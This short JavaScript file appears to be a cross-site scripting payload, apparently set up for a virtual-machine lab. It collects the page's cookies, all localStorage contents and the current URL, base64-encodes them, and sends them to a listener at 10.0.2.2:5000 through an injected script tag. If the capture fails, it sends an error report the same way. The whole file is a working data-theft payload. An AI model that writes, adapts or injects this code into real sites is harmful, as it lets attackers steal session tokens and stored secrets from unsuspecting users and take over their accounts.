(function(){
    function safeBtoa(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    try {
        var cookie = document.cookie || "None";
        
        var localData = "LS: ";
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var value = localStorage.getItem(key);
            localData += key + "=" + value + "; ";
        }

        var location = window.location.href;
        var rawData = "Cookies: " + cookie + " | Local: " + localData + " | URL: " + location;
        var data = safeBtoa(rawData);
        
        var scriptTag = document.createElement('script');
        
        // using IP 10.0.2.2 to reach from VM to host machine
        scriptTag.src = "http://10.0.2.2:5000/log?data=" + data;
        
        document.head.appendChild(scriptTag);

    } catch (err) {
        var errorData = safeBtoa("CRASH: " + err.message);
        var errScript = document.createElement('script');
        errScript.src = "http://10.0.2.2:5000/log?data=" + errorData;
        document.head.appendChild(errScript);
    }
})();